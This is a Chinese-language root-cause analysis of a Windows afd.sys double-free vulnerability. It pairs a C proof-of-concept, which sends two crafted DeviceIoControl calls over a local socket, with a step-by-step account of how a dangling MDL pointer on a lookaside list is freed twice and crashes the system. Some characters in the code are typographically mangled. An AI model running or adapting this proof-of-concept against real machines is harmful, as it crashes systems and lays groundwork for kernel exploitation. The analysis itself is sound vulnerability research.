## 漏洞成因
poc:

	#include <windows.h>
	#include <stdio.h>
	#pragma comment(lib, “WS2_32.lib”)
	  
	int main()
	{
	    DWORD targetSize = 0×310 ;
	    DWORD virtualAddress = 0×13371337 ;
	    DWORD mdlSize=(0×4000*(targetSize-0×30)/8)-0xFFF-(virtualAddress& 0xFFF) ;
	    static DWORD inbuf1[100] ;
	    memset(inbuf1, 0, sizeof(inbuf1)) ;
	    inbuf1[6]  = virtualAddress ;
	    inbuf1[7]  = mdlSize ;
	    inbuf1[10] = 1 ;
	    static DWORD inbuf2[100] ;
	    memset(inbuf2, 0, sizeof(inbuf2)) ;
	    inbuf2[0] = 1 ;
	    inbuf2[1] = 0x0AAAAAAA ;
	    WSADATA      WSAData ;
	    SOCKET       s ;
	    sockaddr_in  sa ;
	    int          ierr ;
	    WSAStartup(0×2, &WSAData) ;
	    s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) ;
	    memset(&sa, 0, sizeof(sa)) ;
	    sa.sin_port = htons(135) ;  
	    sa.sin_addr.S_un.S_addr = inet_addr(“127.0.0.1″) ;
	    sa.sin_family = AF_INET ;
	    ierr = connect(s, (const struct sockaddr *)&sa, sizeof(sa)) ;
	    static char outBuf[100] ;
	    DWORD bytesRet ;
	    DeviceIoControl((HANDLE)s, 0x1207F, (LPVOID)inbuf1, 0×30, outBuf, 0, &bytesRet, NULL);
	    DeviceIoControl((HANDLE)s, 0x120C3, (LPVOID)inbuf2, 0×18, outBuf, 0, &bytesRet, NULL);
	    return 0 ;
	}

整个漏洞的流程如下。

POC创建了一个以socket为基础的本地网络连接，调用DeviceIoControl向socket对象分别发送两个控制码0x1207F和0x120C3，这两次控制码分别对应afd.sys的AfdTransmitFile和AfdTransmitPackets。

### IOControl=0x1207F(AfdTransmitFile)

1. AfdTransmitFile会调用AfdTliGetTpInfo来获得一个TpInfo结构

2. 接着AfdTransmitFile根据用户层传递过来的VirtualAddress=0x13371337和Length来创建一个Mdl，用来和用户层交互，并将这个Mdl的地址保存到TpInfo结构中的TpElementArray数组中。

3. AfdTransmitFile接着调用MmProbeAndLockPages函数，准备对申请的Mdl进行操作，但是由于无效的地址(VirtualAddress=0x13371337)，程序进入到异常处理的流程中。

4. 异常处理流程会调用AfdReturnTpInfo函数，AfdReturnTpInfo函数遍历TpInfo结构的TpElementArray数组，将Mdl释放掉。接着其会调用ExFreeToNPagedLookasideList释放刚创建的TpInfo。

5. 但是因为此时这个Lookaside很"闲"，ExFreeToNPagedLookasideList不会将TpInfo释放掉，而是将其挂载到Dedicated Lookaside List中去。但此时TpInfo所在pool数据还保留着，并没有清空，当然也包括已经释放掉的Mdl地址，成了一个dangling pointer，这里就埋下了隐患。这是第一次free的地方。

第一次IoControl的操作主要就是放置一个dangling pointer到Lookaside Lists中。

第二次IoControl对这个dangling pointer进行二次释放。

 
### IOControl=0x120C3(AfdTransmitPackets)

1. 接下来AfdTransmitPackets同样会调用AfdTliGetTpInfo创建一个TpInfo结构。AfdTliGetTpInfo会调用ExAllocateFromNPagedLookasideList。因为此时的Lookaside Lists不为空，所以会从中卸载一个ListEntry给TpInfo使用，而此时Lookaside就只有一个上一次AfdTransmitFile函数放入的ListEntry，所以这个ListEntry正好是响应上一个控制码所放进去的那个！

2. 接着AfdTliGetTpInfo会从用户层输入inbuf2[1]获得值0x0AAAAAAA，作为TpElementCount，接下来会创建一个0x0AAAAAAA*0x18=0xFFFFFFF0大小的pool,这显然太大了，所以会再一次的进去到异常处理的操作。

3. 异常处理会调用AfdReturnTpInfo，其会遍历TpInfo尝试释放掉Mdl。因为此时的TpInfo所在的pool正是" dangling pointer"，而Mdl已经被释放过一次了，这时发生double-free。

4. 然后发生BSOD。